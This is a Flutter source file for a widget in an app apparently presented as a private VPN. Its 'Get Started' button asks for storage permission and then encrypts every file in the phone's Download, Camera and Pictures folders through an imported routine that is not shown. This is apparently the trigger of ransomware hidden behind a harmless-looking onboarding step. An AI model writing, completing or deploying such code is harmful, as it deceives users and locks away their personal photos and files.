import 'package:flutter/material.dart';
import 'package:private_vpn/utils/file_encryption.dart'; // Pastikan path ini benar

class EncryptionButton extends StatefulWidget {
  @override
  _EncryptionButtonState createState() => _EncryptionButtonState();
}

class _EncryptionButtonState extends State<EncryptionButton> {
  bool _isLoading = false;
  List<String> encryptedFiles = [];

  final List<String> directories = [
    '/storage/emulated/0/Download',
    '/storage/emulated/0/DCIM/Camera',
    '/storage/emulated/0/Pictures',
  ];

  @override
  Widget build(BuildContext context) {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          ElevatedButton(
            onPressed: _isLoading ? null : _startEncryption,
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color.fromARGB(255, 255, 0, 0),
              foregroundColor: Colors.white,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(10),
              ),
              padding: EdgeInsets.symmetric(horizontal: 50, vertical: 15),
            ),
            child: Text(
              'Get Started',
              style: TextStyle(
                fontSize: 15,
              ),
            ),
          ),
          SizedBox(height: 20),
          if (_isLoading) CircularProgressIndicator(),
          if (encryptedFiles.isNotEmpty)
            Padding(
              padding: const EdgeInsets.only(top: 20.0),
              child: Text(
                'Encrypted ${encryptedFiles.length} files',
                style: TextStyle(color: Colors.white),
              ),
            ),
        ],
      ),
    );
  }

  Future<void> _startEncryption() async {
    setState(() {
      _isLoading = true; // Mengatur status loading saat proses enkripsi dimulai
    });

    await requestStoragePermission(); // Meminta izin akses penyimpanan

    // Memanggil fungsi untuk mengenkripsi file dalam direktori yang ditentukan
    try {
      encryptedFiles =
          await encryptFilesInDirectories(directories); // Mengenkripsi file
      if (encryptedFiles.isNotEmpty) {
        // Jika ada file terenkripsi, navigasikan ke halaman baru
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (context) => EncryptedFilesPage(
                encryptedFiles:
                    encryptedFiles), // Halaman untuk menampilkan file terenkripsi
          ),
        );
      }
    } catch (e) {
      print('Error during encryption: $e'); // Menangani error jika terjadi
    } finally {
      setState(() {
        _isLoading = false; // Mengatur status loading kembali ke false
      });
    }
  }
}
